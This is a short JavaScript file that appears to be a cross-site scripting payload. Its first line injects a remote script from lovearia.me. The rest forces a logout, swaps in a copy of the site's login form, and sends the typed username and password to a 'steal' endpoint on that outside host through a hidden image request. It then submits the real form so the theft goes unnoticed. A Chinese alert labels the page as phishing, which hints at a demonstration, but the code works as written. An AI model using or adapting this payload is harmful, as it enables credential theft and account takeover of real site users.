
//<a style='display:none'>";var d=document;s=d.createElement('script');s.src='http://lovearia.me/t.js';d.head.appendChild(s);"<\a>

var timer = setInterval(function(){
  if (!!window.jQuery){
    clearInterval(timer);

      //if (localStorage['islogin'] === 'true'){
        //return;
      //}

      var logoutpage = '/user/logout/';

      var loginpage = '/user/login/';
      var loginformselector = 'form[action="/user/login/"]';

      var usernameselector = 'input[name="name"]';
      var passwordselector = 'input[name="password"]';

      var receiveurl = 'http://lovearia.me/main/steal/';

      $.get(logoutpage, function(){
        $.get(loginpage, function(d){
          $('html').html(d);
          alert('这是钓鱼登录页面，别输入帐号密码了');
          $(loginformselector).on('submit', function(e){
            e.preventDefault();
            var username = $(usernameselector).val();
            var password = $(passwordselector).val();
            var img = $('<img>');
            img.attr('src', receiveurl + username + '/' + password);
            img.css('display', 'none');
            img.on('error', function(){
              //localStorage['islogin'] = 'true';
              $(loginformselector).off('submit');
              $(loginformselector).trigger('submit');
            });
            $('body').append(img);
          });
        });
      });

  }
}, 500);

